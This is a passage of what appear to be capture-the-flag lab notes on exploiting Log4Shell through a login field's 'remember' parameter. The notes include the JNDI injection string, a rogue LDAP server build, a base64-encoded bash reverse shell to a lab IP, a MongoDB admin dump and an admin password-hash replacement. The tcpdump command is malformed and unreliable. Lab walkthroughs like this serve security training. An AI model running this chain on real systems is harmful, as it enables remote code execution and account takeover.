We input the payload into the `remember` field as shown above so that we can identify an injection point if one exists. If the request causes the server to connect back to us, then we have verified that the application is vulnerable.

==`${jndi:ldap://{Tun0 IP Address}/whatever}`==

![[Pasted image 20240517153322.png]]


![[Pasted image 20240517153416.png]]

The output shows us an error message stating that the payload is invalid, but despite the error message the payload is actually being executed.


Launch **TCPDUMP** on port 389 to view the requests

==`tcpdump -i tun0:389`==

We will have to install ==`Open-JDK`== and ==`Maven`== on our system in order to build a payload that we can send to the server and will give us Remote Code Execution on the vulnerable system.


==`apt install openjdk-11-jdk -y`==
==`apt-get install maven`==

![[Pasted image 20240517160346.png]]

These applications will also help us run the `rogue-jndi` Java application, which starts a local ==LDAP server== and allows us to receive connections back from the vulnerable server and execute malicious code.


Let's clone the respective repository and build the package using Maven. 
==`git clone https://github.com/veracode-research/rogue-jndi`== 
==`cd rogue-jndi`==

```
### Description
The project contains LDAP & HTTP servers for exploiting insecure-by-default Java JNDI API.<br> 
In order to perform an attack, you can start these servers locally and then trigger a JNDI resolution on the vulnerable client, e.g.:

java
InitialContext.doLookup("ldap://your_server.com:1389/o=reference");

It will initiate a connection from the vulnerable client to the local LDAP server.
Then, the local server responds with a malicious entry containing one of the payloads, that can be useful to achieve a Remote Code Execution.
```

==`mvn package`==

![[Pasted image 20240517160848.png]]

![[Pasted image 20240517160920.png]]

This will create a .jar file in `rogue-jndi/target/` directory called `RogueJndi-1.1.jar` . Now we can construct our payload to pass into the `RogueJndi-1-1.jar` Java application. 

To use the Rogue-JNDI server we will have to construct and pass it a payload, which will be responsible for giving us a shell on the affected system. We will be Base64 encoding the payload to prevent any encoding issues.


==`echo 'bash -c bash -i >&/dev/tcp/10.10.16.45/5555 0>&1'| base64`==

==`java -jar target/RogueJndi-1.1.jar --command "bash -c {echo,BASE64 STRING HERE}| {base64,-d}|{bash,-i}" --hostname "{YOUR TUN0 IP ADDRESS}"`==


==`java -jar RogueJndi-1.1.jar --command "bash -c {echo,YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTYuNDUvNTU1NSAwPiYxCg==}|{base64,-d}|{bash,-i}" --hostname "10.10.16.45"`==

==`mongo --port 27117 ace --eval "db.admin.find().forEach(printjson);"`==

![[Pasted image 20240528113441.png]]


The output reveals a user called Administrator. Their password hash is located in the x_shadow variable but in this instance it cannot be cracked with any password cracking utilities. 

Instead we can change the x_shadow password hash with our very own created hash in order to replace the administrators password and authenticate to the administrative panel. To do this we can use the mkpasswd command line utility

the `$6$` indicates a Sha-512 Hash

==`mkpasswd -m sha-512 Password1234==`
